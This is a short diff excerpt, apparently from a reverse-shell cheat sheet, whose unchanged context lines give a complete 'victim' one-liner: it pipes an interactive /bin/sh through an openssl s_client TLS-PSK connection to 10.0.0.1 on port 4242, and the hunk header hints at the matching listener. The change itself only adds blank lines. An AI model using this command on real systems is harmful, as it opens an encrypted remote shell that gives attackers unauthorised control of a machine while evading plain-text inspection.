@@ -20,3 +20,5 @@ export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromab
 # client (victim)
 export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
 ```
+
+
